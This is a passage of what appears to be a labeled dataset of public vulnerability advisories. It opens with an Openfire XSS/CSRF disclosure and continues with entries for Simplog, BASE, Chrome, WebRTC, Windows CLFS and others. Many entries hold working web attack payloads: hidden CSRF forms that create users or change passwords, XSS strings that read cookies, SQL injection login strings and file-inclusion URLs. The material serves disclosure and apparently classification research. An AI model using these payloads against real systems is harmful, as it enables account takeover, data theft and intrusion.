following curl command allows reproducing the attack against the Openfire *server-properties.jsp* page:  ``` curl --data=""propName=adminConsole.port&propValue=9090%22+onmouseover%3D%22alert%28%27xxs%27%29%22+x%3D%22&encrypt=false&save=Save+Property"" http://OpenFireServerIP:9090/server-properties.jsp --cookie=""JSESSIONID=XXX"" ```  The folling code allows exploiting the vulnerability:  ``` <iframe style=""display:none"" name=""xss-frame""></iframe> <form id=""xss-form"" action=""http://OpenFireServerIP:9090/server-properties.jsp"" method=""post"" target=""xss-frame"" > <input type=""text"" name=""propValue"" value=""=adminConsole.port"" > <input type=""text"" name=""searchname"" value=""9090%22 onmouseover=%22alert('XSS')%22 x=""/> <input type=""text"" name=""encrypt"" value=""false"" > <input type=""text"" name=""save"" value=""Save Property"" > </form>  <script>document.getElementById(""xss-form"").submit()</script> ```   ###Affected versions  * Version 4.0.0 and 4.0.1   ## Several CSRF Vulnerabilities identified in Openfire 3.10.2  **Access Vector**: remote  **Security Risk**: low  **Vulnerability**: CWE-312  **CVSS Base Score**: 5.4  [comment]: https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N/E:F/RL:O  ### Vulnerability Description  Several CSRF vulnerabilities have been found on different pages of the admin panel of the OpenFire web server. Throught this attack an attacker could drive a valid user to execute unwittingly a request on the OpenFire sever.   ### Proof of Concept  #### *connection-settings-external-components.jsp* page is vulerable to a CSRF attack.  The following HTML iframe command allows reproducing the attack against the Openfire *dwr/exec/downloader.installPlugin.dwr* page:  ``` <iframe style=""display:none"" name=""csrf-frame""></iframe> <form id=""csrf-form"" action=""http://OpenFireServerIP:9090/dwr/exec/downloader.installPlugin.dwr"" method=""post"" target=""csrf-frame"" >     <input type=""text"" name=""callCount"" value=""1"" >     <input type=""text"" name=""c0-scriptName"" value=""downloader"" >     <input type=""text"" name=""c0-methodName"" value=""installPlugin"" >     <input type=""text"" name=""c0-id"" value=""9033_1444939787005"" >     <input type=""text"" name=""c0-param0"" value=""string:http://www.igniterealtime.org/projects/openfire/plugins/broadcast.jar"" >     <input type=""text"" name=""c0-param1"" value=""string:8221154"" >     <input type=""text"" name=""xml"" value=""true"" > </form>  <script>document.getElementById(""csrf-form"").submit()</script> ```   #### *client-connections-settings.jsp* is vulerable to a CSRF attack.  The following HTML iframe command allows reproducing the attack against the Openfire *client-connections-settings.jsp* page:  ``` <iframe style=""display:none"" name=""csrf-frame""></iframe> <form id=""csrf-form"" action=""http://OpenFireServerIP:9090/client-connections-settings.jsp"" method=""post"" target=""csrf-frame"" >     <input type=""text"" name=""port"" value=""5222"" >     <input type=""text"" name=""sslEnabled"" value=""false"" >     <input type=""text"" name=""sslPort"" value=""5223"" >     <input type=""text"" name=""idleDisco"" value=""true"" >     <input type=""text"" name=""clientIdle"" value=""360"" >     <input type=""text"" name=""pingIdleClients"" value=""true"" >     <input type=""text"" name=""update"" value=""Save Settings"" > </form>  <script>document.getElementById(""csrf-form"").submit()</script> ```  #### *manage-updates.jsp* is vulerable to a CSRF attack.  The following HTML iframe command allows reproducing the attack against the *Openfire manage-updates.jsp* page:  ``` <iframe style=""display:none"" name=""csrf-frame""></iframe> <form id=""csrf-form"" action=""http://OpenFireServerIP:9090/manage-updates.jsp"" method=""post"" target=""csrf-frame"" >     <input type=""text"" name=""serviceEnabled"" value=""false"" >     <input type=""text"" name=""notificationsEnabled"" value=""false"" >     <input type=""text"" name=""proxyEnabled"" value=""true"" >     <input type=""text"" name=""proxyHost"" value=""10.0.0.1"" >     <input type=""text"" name=""proxyPort"" value=""6666"" >     <input type=""text"" name=""update"" value=""Save Settings"" > </form>  <script>document.getElementById(""csrf-form"").submit()</script> ```  #### *plugin-admin.jsp* is vulerable to a CSRF attack.  The following HTML iframe command allows reproducing the attack against the Openfire *plugin-admin.jsp* page.  ``` <iframe style=""display:none"" name=""csrf-frame""></iframe> <form id=""csrf-form"" action=""http://OpenFireServerIP:9090/plugin-admin.jsp"" method=""get"" target=""csrf-frame"" >     <input type=""text"" name=""deleteplugin"" value=""broadcast"" > </form>   <script>document.getElementById(""csrf-form"").submit()</script> ```  The following HTML iframe command allows reproducing the attack against the Openfire *reg-settings.jsp* page:  ``` <iframe style=""display:none"" name=""csrf-frame""></iframe> <form id=""csrf-form"" action=""http://OpenFireServerIP:9090/reg-settings.jsp"" method=""get"" target=""csrf-frame"" >     <input type=""text"" name=""inbandEnabled"" value=""false"" >     <input type=""text"" name=""canChangePassword"" value=""false"" >     <input type=""text"" name=""anonLogin"" value=""fasle"" >     <input type=""text"" name=""allowedIPs"" value=""0.0.0.0"" >     <input type=""text"" name=""allowedAnonymIPs"" value=""0.0.0.0"" >     <input type=""text"" name=""save"" value=""Save Settings"" > </form>   <script>document.getElementById(""csrf-form"").submit()</script> ```  #### *server-properties.jsp* is vulerable to a CSRF attack.  The following HTML iframe command allows reproducing the attack against the Openfire *server-properties.jsp* admin page.  ``` <iframe style=""display:none"" name=""csrf-frame""></iframe> <form id=""csrf-form"" action=""http://OpenFireServerIP:9090/server-properties.jsp"" method=""post"" target=""csrf-frame"" >     <input type=""text"" name=""propName"" value=""test"" >     <input type=""text"" name=""propValue"" value=""test"" >     <input type=""text"" name=""encrypt"" value=""""false >     <input type=""text"" name=""save"" value=""Save Property"" > </form>  <script>document.getElementById(""csrf-form"").submit()</script> ```  #### *system-email.jsp* is vulerable to a CSRF attack.  The following HTML iframe command allows reproducing the attack against the Openfire *system-email.jsp* admin page.  ``` <iframe style=""display:none"" name=""csrf-frame""></iframe> <form id=""csrf-form"" action=""http://OpenFireServerIP:9090/system-email.jsp"" method=""post"" target=""csrf-frame"" >     <input type=""text"" name=""host"" value=""mail.google.com"" >     <input type=""text"" name=""port"" value=""25"" >     <input type=""text"" name=""debug"" value=""false"" >     <input type=""text"" name=""server_username"" value=""toto"" >     <input type=""text"" name=""server_password"" value=""toto"" >     <input type=""text"" name=""save"" value=""Save Changes"" > </form> ```  ### Affected versions  * Version >= 3.10.2 and < 4.0.0   ## Several CSRF Vulnerabilities identified in Openfire 3.10.2  **Access Vector**: remote  **Security Risk**: low  **Vulnerability**: CWE-312  **CVSS Base Score**: 5.4  [comment]: https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N/E:F/RL:O  ### Vulnerability Description  Several CSRF vulnerabilities have been found on different pages of the admin panel of the OpenFire web server. Through this attack, an attacker could drive a valid user to execute unwittingly a request to the OpenFire sever.  These vulnerabilities have already been found by hyp3rlinx, but had not been patched yet.  ### Proof of Concept  #### *connection-settings-external-components.jsp* is vulerable to a CSRF attack.  The following HTML iframe command allows reproducing the attack against the Openfire *dwr/exec/downloader.installPlugin.dwr* page:  ``` <iframe style=""display:none"" name=""csrf-frame""></iframe> <form id=""csrf-form"" action=""http://OpenFireServerIP:9090/user-create.jsp"" method=""get"" target=""csrf-frame"" >     <input type=""text"" name=""name"" value=""Evil"" >     <input type=""text"" name=""email"" value=""evil@evil.f"" >     <input type=""text"" name=""password"" value=""evil"" >     <input type=""text"" name=""passwordConfirm"" value=""evil"" >     <input type=""text"" name=""create"" value=""Create+User"" > </form>  <script>document.getElementById(""csrf-form"").submit()</script> ```  #### *client-connections-settings.jsp* is vulerable to a CSRF attack.  The following HTML iframe command allows reproducing the attack against the Openfire *client-connections-settings.jsp* page.  ``` <iframe style=""display:none"" name=""csrf-frame""></iframe> <form id=""csrf-form"" action=""http://OpenFireServerIP:9090/user-password.jsp"" method=""post"" target=""csrf-frame"" >     <input type=""text"" name=""username"" value=""victim"" >     <input type=""text"" name=""password"" value=""evil"" >     <input type=""text"" name=""passwordConfirm"" value=""evil"" >     <input type=""text"" name=""update"" value=""Update+Password"" > </form>  <script>document.getElementById(""csrf-form"").submit()</script> ```  ### Affected versions  * Version 4.0.0 and 4.0.1   ## Sensitive information disclosure in OpenFire Server <=3.10.2  **Access Vector**: remote  **Security Risk**: low  **Vulnerability**: CWE-200  **CVSS Base Score**: 5.5  [comment]: https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:L/A:N/E:F/RL:O  ### Vulnerability Description  A sensitive information disclosure vulnerabilty is present in the page *system-email.jsp*. It allow's an authenticated user to retreive the md5 hash the password of an email account.  ### Vulnerable code  The following HTML code is reveived by an authenticated user on the page system-email.jsp. The md5 hash of the password is sent to the user.  ``` <tr>     <td nowrap>         Server Username (Optional):     </td>     <td nowrap>         <input type=""text"" name=""server_username"" value=""myusername"" size=""40"" maxlength=""150"">     </td> </tr> <tr>     <td nowrap>         Server Password (Optional):     </td>     <td nowrap>         <input type=""password"" name=""server_password"" value=""34819d7beeabb9260a5c854bc85b3e44"" size=""40"" maxlength=""150"">     </td> </tr> ```   ### Affected versions  * Version >=3.10.2 and <4.0.2  ### Fixes  * https://github.com/igniterealtime/Openfire/pull/570  ### Solution  Update to version 4.0.2  ### Timeline (dd/mm/yyyy)  * 15/10/2014 : Initial discovery * 19/10/2015 : Contact with vendor team * 27/11/2014 : vendor fixes vulnerabilities * 27/11/2014 : vendor releases version 4.0.2, which includes the fixes  ## Credits  * Florian Nivette <f.nivette@sysdream.com>     -- SYSDREAM Labs <labs@sysdream.com> GPG : 47D1 E124 C43E F992 2A2E 1551 8EB4 8CD9 D5B2 59A1 * Website: https://sysdream.com/ * Twitter: @sysdream",code execution,1
10180,"Simplog 0.9.3.2 - Multiple Vulnerabilities ################################################################################ Mutliple Vulnerabilities in Simplog v0.9.3.2  Name Multiple vulnerabilities in Simplog Systems Affected Simplog 0.9.3.2 and possibly earlier versions Download http://sourceforge.net/projects/simplog/files/simplog/0.9.3.2/simplog-0.9.3.2.tar.gz/download Author Amol Naik (amolnaik4[at]gmail.com) Date 16/11/2009 ################################################################################   ############ 1. OVERVIEW ############  Simplog provides an easy way for users to add blogging capabilities to their existing websites. Simplog is written in PHP and compatible with multiple databases. Simplog also features an RSS/Atom aggregator/reader.  ############### 2. DESCRIPTION ###############  Simplog is vulnerable to Persistent cross-site scripting, cross-site request forgery and unauthorized comment deletion.  ###################### 3. TECHNICAL DETAILS ######################  Summery:  (A) Persistent Cross-site Scripting (B) Cross Site Request Forgery (C) Edit/Delete Comments (Bypassing Authorization)   (A) Persistent Cross-site Scripting ++++++++++++++++++++++++++++++++++++  Vulnerable page comments.php Vulnerable Parameters cname, email  When adding a comment for any blog entry, it is possible to add a Persistent XSS payload in ""Name"" & ""Email"" parameters due to improper sanitization of the user inputs.  ++++ POC ++++  Put this in the comment:  Name: alert(""AMol_NAik"") email:"">alert(""AMol_NAik"")   (B) Cross Site Request Forgery +++++++++++++++++++++++++++++++  Vulnerable Page user.php  This application is vulenrable to CSRF which changes the password of an authenticated user. This is applicable to Admin as well.  ++++ POC ++++  http://server/simplog/user.php?pass1=&pass2=&blogid=&act=change   For example, if an authenticated user clicks on the below link, his/her password changes to ""AMol_NAik"".  http://server/simplog/user.php?pass1=AMol_NAik&pass2=AMol_NAik&blogid=1&act=change   (C) Edit/Delete Comments (Bypassing Authorization) +++++++++++++++++++++++++++++++++++++++++++++++++++  Vulnerable Page comments.php Vulnerable Parameters op, cid  The application provides a function to edit n delete the comments to Blog Admin. It is possible for attacker to edit/delete any comment due to improper authorization.  ++++ POC ++++  Edit comment: http://server/simplog/comments.php?op=edit&cid= Delete Comment: http://server/simplog/comments.php?op=del&cid=   ############ 4. TimeLine ############  03/11/2009 Bug Discovered 03/11/2009 Reported to Vendor 16/11/2009 No response received till the date 16/11/2009 Public Disclosure",information disclosure,1
36732,"Basic Analysis and Security Engine (BASE) 1.4.5 - 'base_stat_ports.php?base_path' Remote File Inclusion source: https://www.securityfocus.com/bid/51979/info                                BASE is prone to a security-bypass vulnerability and multiple remote file-include vulnerabilities.                                An attacker can exploit these issues to gain unauthorized access, obtain potentially sensitive information, or execute arbitrary script code in the context of the webserver process. This may allow the attacker to compromise the application and the computer; other attacks are also possible.                                BASE 1.4.5 is vulnerable; other versions may be affected.  Exploit: http://www.example.com/base/base_stat_ports.php?BASE_path=[EV!L]","gain unauthorized access, obtain potentially sensitive information, or execute arbitrary script code in the context of the webserver process",1
26862,ScareCrow 2.13 - 'profile.cgi?user' Cross-Site Scripting source: https://www.securityfocus.com/bid/15915/info   ScareCrow is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.   An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.   These issues affect version 2.13; other versions may also be vulnerable.  http://www.example.com/profile.cgi?action=view&user=[XSS],have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site,1
46565,"Google Chrome < M73 - Double-Destruction Race in StoragePartitionService There's a race condition in the destruction of the BindingState for bindings to the StoragePartitionService.  It looks like the root cause of the issue is that since we can get two concurrent calls to callbacks returned from mojo::BindingSet::GetBadMessageCallback() from the same BindingSet, which results in a data race destroying the same BindingState.  One case where this can be called is in a synchronous context when validating a received message, or when tearing down the connection. The other context is the callback passed to OpenSessionStorage here  https://cs.chromium.org/chromium/src/content/browser/storage_partition_impl.cc?rcl=59d4c1b34bfde4fbc31f7a40ab7d0e7df58ffd67&l=912  This is then posted to the mojo task runner thread here:  https://cs.chromium.org/chromium/src/content/browser/dom_storage/dom_storage_context_wrapper.cc?rcl=59d4c1b34bfde4fbc31f7a40ab7d0e7df58ffd67&l=433  And can be called on this thread directly here:  https://cs.chromium.org/chromium/src/content/browser/dom_storage/session_storage_context_mojo.cc?rcl=59d4c1b34bfde4fbc31f7a40ab7d0e7df58ffd67&l=140  Since this is a tight race, the repro is not terribly reliable. Opening multiple tabs at once will increase your chances of reproducing to the point where the issue triggers around 50% of the time (on my machine, mileage will vary depending on system load etc...). I found the most convenient way to reproduce was to use a ThreadSanitizer build, but since the most common result is a double-free, this will often crash a normal release build when the freelist corruption is detected.  $ python ./copy_mojo_js_bindings.py /path/to/chrome/.../out/Asan/gen $ python -m SimpleHTTPServer& $ /ssd/chrome_trunk/src/out/Tsan/chrome --enable-blink-features=MojoJS --no-sandbox --user-data-dir=/tmp/aa 'http://localhost:8000/index.html' 'http://localhost:8000/index.html' 'http://localhost:8000/index.html' 'http://localhost:8000/index.html' 'http://localhost:8000/index.html' 'http://localhost:8000/index.html' 'http://localhost:8000/index.html' 'http://localhost:8000/index.html'   Proof of Concept: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/46565.zip",denial of service,1
21478,"OpenBB 1.0 - Unauthorized Moderator Access source: https://www.securityfocus.com/bid/4823/info  OpenBB is web forum software written in PHP. It will run on most Linux and Unix variants, in addition to Microsoft Windows operating systems.  OpenBB is reported to be vulnerable to a condition that will allow an unauthorized user to gain moderator or administrative access to forums. The attacker is only able to change a few properties of the forums.   http://www.site.com/moderator.php?action=lock&TID=LIDDUFORUM&ismod=1  This will lock the forum. Other keywords include 'action=sticky' or 'action=important'.",gain moderator or administrative access to forums,1
33354,"PHD Help Desk 1.43 - 'area.php' Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/37029/info  PHD Help Desk is prone to multiple cross-site scripting vulnerabilities because the application fails to sufficiently sanitize user-supplied data.  Attacker-supplied HTML or JavaScript code could run in the context of the affected site, potentially allowing the attacker to steal cookie-based authentication credentials; other attacks are also possible.  PHD Help Desk 1.43 is vulnerable; other versions may also be affected.   http://www.example.com/area.php/[code] http://www.example.com/area.php?pagina=[code] http://www.example.com/area.php?sentido=[code] http://www.example.com/area.php?q_registros=[code] http://www.example.com/area.php?orden=[code]",the application fails to sufficiently sanitize user-supplied data,0
36507,"Microsoft AntiXSS 3/4.0 Library Sanitization Module - Security Bypass source: https://www.securityfocus.com/bid/51291/info  Microsoft Anti-Cross Site Scripting (AntiXSS) Library is prone to a security-bypass vulnerability that affects the sanitization module.  An attacker can exploit this vulnerability to bypass the filter and conduct cross-site scripting attacks. Successful exploits may allow attackers to execute arbitrary script code and steal cookie-based authentication credentials.  Microsoft Anti-Cross Site Scripting Library 3.x and 4.0 are vulnerable.  string data = Microsoft.Security.Application.Sanitizer.GetSafeHtml(""a<style><!--div{font-family:Foo,Bar\\,'a\\a';font-family:';color:expression(alert(1));y'}--></style><div>b</div>"");  string data = Microsoft.Security.Application.Sanitizer.GetSafeHtmlFragment(""<div style="""">aaa</div>"")",execute arbitrary script code and steal cookie-based authentication credentials,1
36629,"Joomla! Component com_motor - 'cid' SQL Injection source: https://www.securityfocus.com/bid/51673/info  The 'com_motor' component for Joomla! is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.    http://www.example.com/index.php?option=com_motor&controller=motor&task=edit&cid[0]=[SQL Injection]","compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database",1
28922,"AIOCP 1.3.x - 'load_page' Remote File Inclusion source: https://www.securityfocus.com/bid/20931/info      All In One Control Panel (AIOCP) is prone to multiple input-validation vulnerabilities because it fails to sufficiently sanitize user-supplied input data.      Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, access or modify sensitive data, execute arbitrary script code in the context of the application, compromise the application and possibly exploit latent vulnerabilities in the underlying system; other attacks are also possible.      AIOCP 1.3.007 and prior versions are vulnerable.  /admin/code/index.php?load_page=http%3A//google.com ( no login needed for the remote file include )",fails to sufficiently sanitize user-supplied input data,0
45122,"WebRTC - FEC Processing Overflow There are several calls to memcpy that can overflow the destination buffer in webrtc::UlpfecReceiverImpl::AddReceivedRedPacket. The method takes a parameter incoming_rtp_packet, which is an RTP packet with a mac length that is defined by the transport (2048 bytes for DTLS in Chrome). This packet is then copied to the received_packet in several locations in the method, depending on packet properties, using the lenth of the incoming_rtp_packet as the copy length. The received_packet is a ForwardErrorCorrection::ReceivedPacket, which has a max size of 1500. Therefore, the memcpy calls in this method can overflow this buffer.  ==204614==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x61b000046670 at pc 0x00000059d958 bp 0x7ffcac5716f0 sp 0x7ffcac570ea0 WRITE of size 2316 at 0x61b000046670 thread T0     #0 0x59d957 in __asan_memcpy /b/build/slave/linux_upload_clang/build/src/third_party/llvm/compiler-rt/lib/asan/asan_interceptors_memintrinsics.cc:23:3     #1 0x1b6aacc in webrtc::UlpfecReceiverImpl::AddReceivedRedPacket(webrtc::RTPHeader const&, unsigned char const*, unsigned long, unsigned char) modules/rtp_rtcp/source/ulpfec_receiver_impl.cc:173:5     #2 0x1b3cd5c in webrtc::RtpVideoStreamReceiver::ParseAndHandleEncapsulatingHeader(unsigned char const*, unsigned long, webrtc::RTPHeader const&) video/rtp_video_stream_receiver.cc:426:27     #3 0x1b39a31 in webrtc::RtpVideoStreamReceiver::ReceivePacket(unsigned char const*, unsigned long, webrtc::RTPHeader const&) video/rtp_video_stream_receiver.cc:402:5     #4 0x1b3a895 in webrtc::RtpVideoStreamReceiver::OnRtpPacket(webrtc::RtpPacketReceived const&) video/rtp_video_stream_receiver.cc:301:3     #5 0x8c7a26 in webrtc::RtpDemuxer::OnRtpPacket(webrtc::RtpPacketReceived const&) call/rtp_demuxer.cc:157:11     #6 0x8cec3d in webrtc::RtpStreamReceiverController::OnRtpPacket(webrtc::RtpPacketReceived const&) call/rtp_stream_receiver_controller.cc:55:19     #7 0x12e8507 in webrtc::internal::Call::DeliverRtp(webrtc::MediaType, rtc::CopyOnWriteBuffer, webrtc::PacketTime const&) call/call.cc:1291:36     #8 0x12e92a0 in webrtc::internal::Call::DeliverPacket(webrtc::MediaType, rtc::CopyOnWriteBuffer, webrtc::PacketTime const&) call/call.cc:1316:10     #9 0x5da2a6 in webrtc::RtpReplay() video/replay.cc:635:31     #10 0x5dd5fe in main video/replay.cc:700:3     #11 0x7feaa1ee92b0 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x202b0)  0x61b000046670 is located 0 bytes to the right of 1520-byte region [0x61b000046080,0x61b000046670) allocated by thread T0 here:     #0 0x5c9362 in operator new(unsigned long) /b/build/slave/linux_upload_clang/build/src/third_party/llvm/compiler-rt/lib/asan/asan_new_delete.cc:93:3     #1 0x1b6a8c8 in webrtc::UlpfecReceiverImpl::AddReceivedRedPacket(webrtc::RTPHeader const&, unsigned char const*, unsigned long, unsigned char) modules/rtp_rtcp/source/ulpfec_receiver_impl.cc:165:35     #2 0x1b3cd5c in webrtc::RtpVideoStreamReceiver::ParseAndHandleEncapsulatingHeader(unsigned char const*, unsigned long, webrtc::RTPHeader const&) video/rtp_video_stream_receiver.cc:426:27     #3 0x1b39a31 in webrtc::RtpVideoStreamReceiver::ReceivePacket(unsigned char const*, unsigned long, webrtc::RTPHeader const&) video/rtp_video_stream_receiver.cc:402:5     #4 0x1b3a895 in webrtc::RtpVideoStreamReceiver::OnRtpPacket(webrtc::RtpPacketReceived const&) video/rtp_video_stream_receiver.cc:301:3     #5 0x8c7a26 in webrtc::RtpDemuxer::OnRtpPacket(webrtc::RtpPacketReceived const&) call/rtp_demuxer.cc:157:11     #6 0x8cec3d in webrtc::RtpStreamReceiverController::OnRtpPacket(webrtc::RtpPacketReceived const&) call/rtp_stream_receiver_controller.cc:55:19     #7 0x12e8507 in webrtc::internal::Call::DeliverRtp(webrtc::MediaType, rtc::CopyOnWriteBuffer, webrtc::PacketTime const&) call/call.cc:1291:36     #8 0x12e92a0 in webrtc::internal::Call::DeliverPacket(webrtc::MediaType, rtc::CopyOnWriteBuffer, webrtc::PacketTime const&) call/call.cc:1316:10     #9 0x5da2a6 in webrtc::RtpReplay() video/replay.cc:635:31     #10 0x5dd5fe in main video/replay.cc:700:3     #11 0x7feaa1ee92b0 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x202b0)  SUMMARY: AddressSanitizer: heap-buffer-overflow /b/build/slave/linux_upload_clang/build/src/third_party/llvm/compiler-rt/lib/asan/asan_interceptors_memintrinsics.cc:23:3 in __asan_memcpy Shadow bytes around the buggy address:   0x0c3680000c70: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x0c3680000c80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x0c3680000c90: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x0c3680000ca0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x0c3680000cb0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 =>0x0c3680000cc0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00[fa]fa   0x0c3680000cd0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   0x0c3680000ce0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   0x0c3680000cf0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   0x0c3680000d00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   0x0c3680000d10: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa Shadow byte legend (one shadow byte represents 8 application bytes):   Addressable:           00   Partially addressable: 01 02 03 04 05 06 07    Heap left redzone:       fa   Freed heap region:       fd   Stack left redzone:      f1   Stack mid redzone:       f2   Stack right redzone:     f3   Stack after return:      f5   Stack use after scope:   f8   Global redzone:          f9   Global init order:       f6   Poisoned by user:        f7   Container overflow:      fc   Array cookie:            ac   Intra object redzone:    bb   ASan internal:           fe   Left alloca redzone:     ca   Right alloca redzone:    cb   To reproduce this issue:  1) replace video/replay.cc with the attached version, and build it with asan (ninja -C out/asan video_replay). Note that this file adds the ability to load a full receiver config to the video replay tool, I'm hoping to eventually get this change committed to WebRTC.  2) Download the attached files config4.txt and fallbackoob1  3) run video_replay --input_file  fallbackoob1  --config_file config4.txt  Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/45122.zip",denial of service,1
37038,"osCMax 2.5 - '/admin/login.php?Username' Cross-Site Scripting source: https://www.securityfocus.com/bid/52886/info  osCMax is prone to multiple SQL-injection vulnerabilities and multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied input.  Exploiting these vulnerabilities could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  osCMax 2.5.0 is vulnerable; prior versions may also be affected.   <form action=""http://www.example.com/admin/login.php?action=process"" method=""post"" name=""main"" id=""main""> <input type=""hidden"" name=""username"" value=""'<script>alert(document.cookie);</script>""> <input type=""hidden"" name=""password"" value=""""> <input type=""submit"" name=""submit"" value=""Send""> </form>",fails to sufficiently sanitize user-supplied input,0
26106,"Gravity Board X 1.1 - Login SQL Injection source: https://www.securityfocus.com/bid/14497/info  Gravity Board X (GBX) is prone to an SQL injection vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input before using it in an SQL query.  Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation.   The following demonstrates login credentials sufficient to exploit this vulnerability: login: ' or isnull(1/0) /* password: whatever",exploit vulnerabilities in the underlying database implementation,1
33854,vBulletin Two-Step External Link Module - 'externalredirect.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/39597/info  Two-Step External Link module for vBulletin is prone to a cross-site scripting vulnerability because the application fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  http://www.example.com/externalredirect.php?url=XSS,execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site,1
47028,"Microsoft Windows - 'CmpAddRemoveContainerToCLFSLog' Arbitrary File/Directory Creation Windows: CmpAddRemoveContainerToCLFSLog Arbitrary File/Directory Creation EoP Platform: Windows 10 1809 (not tested earlier) Class: Elevation of Privilege Security Boundary (per Windows Security Service Criteria): User boundary  Summary:   The kernel’s CmpAddRemoveContainerToCLFSLog function doesn’t safely create new transaction log containers leading to arbitrary file creation and EoP.  Description:  The configuration manager in the kernel supports creating registry keys within a transaction. To store the transaction log data a CLFS log file is used which is split into multiple containers. These transaction log files are stored within the same directory as the hive files with the names ending BLF. Container files, with the suffix TxR.X.regtrans-ms are created on demand if the amount of transaction data being stored is larger than available log space.   As these container files are created within the security context of the process creating the transaction this creates a problem as the CLFS driver always creates file with the previous mode set to UserMode. This would mean a non-administrator couldn’t create transactions in any hive which is stored in a location they can’t write to, which includes any HKLM hive which wouldn’t be very useful. To solve this problem before calling ClfsAddLogContainer the kernel code attaches the calling thread to the System process and disables any impersonation token which ensures the call to CLFS will come from the SYSTEM user.   This becomes an issue for the user’s registry hives as those hive files are located in user writable locations. Therefore as the names of the containers are predictable (just using an incrementing counter) it’s possible to redirect the container file creation through abusing symbolic links.   Due to the location of the hive file it’d seem initially difficult to exploit this as a normal user as you can’t introduce a NTFS mount point in a parent path as you can’t delete/rename the existing hive files while the user is logged in. On newer versions of Windows with Developer Mode enabled you could create NTFS symbolic links but we’ve got to assume that this setting wouldn’t be enabled by default. It turns out looking at the call to IoCreateFileEx in CLFS that it doesn’t specify either FILE_DIRECTORY_FILE or FILE_NON_DIRECTORY_FILE which means it’s exploitable by abusing mount points as if it were a file level symbolic link (as documented in https://googleprojectzero.blogspot.com/2017/08/windows-exploitation-tricks-arbitrary.html). The file is created with the security descriptor of the original hive/transaction log which means the user can write to the created file.  However this only works until 1803 which fixes this behavior and blocks reparsing from a mount point to a normal file. I’ve not investigated in depth but based on the flags set in the call in Process Monitor this “fix” works by setting the FILE_DIRECTORY_FILE in the parse context if a mount point is encountered before the driver returns STATUS_REPARSE. Ironically this behavior works in our favor, as the call is a FILE_CREATE disposition call then the file doesn’t exist anyway and by dropping a mount point named appropriately the CLFS code will create an arbitrary directory even though the code didn’t originally specify that requirement. Once CLFS realizes it’s created a directory (or at least something it can’t write to) it tries to back out and deletes the new directory, however if we’re quick we can write a file to the new directory (again as the security descriptor grants us access) which makes the delete operation fail. We can then use the directory to get system privileges, such as through abusing the DiagnosticsHub Collector Service.  Funnily enough I think prior to 1803 this would be harder to exploit as the transaction logs seem to be deleted when the user logs out and it wouldn’t be possible to modify the contents of the newly created arbitrary file as it only allows read sharing. An unexpected consequence of a security mitigation it seems.  Fixing wise there’s at least two things you could do. Firstly the generated name is under control of the kernel and so could be more random to prevent resource planting attacks. You could also modify CLFS to specify explicitly FILE_NON_DIRECTORY_FILE and maybe FILE_OPEN_REPARSE_POINT to prevent abuse of mount points and even symbolic links if the target is an NTFS symbolic link.  Proof of Concept:  I’ve provided a PoC as a C# project. It will use the vulnerability to create an arbitrary directory (on 1809 at least). Note that you’re likely to need at least two CPUs for the exploit to be successful as it requires winning the race between the directory being created and then being deleted. Note that if you get an error stating the transaction log file was full then it failed to capture the directory. Try running the PoC again as it should be possible to run it multiple times without significant consequence (although the transaction functionality of the user’s registry _might_ be broken).  1) Compile the C# project. It’ll need to pull NtApiDotNet from NuGet to build. 2) As a normal user run the PoC passing the name of a directory to create  3) The PoC should print the opened directory and granted access.  Expected Result: The file creation   Observed Result: The arbitrary directory was created and is writable by the current user.   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47028.zip",create an arbitrary directory even though the code didn’t originally specify that requirement,1
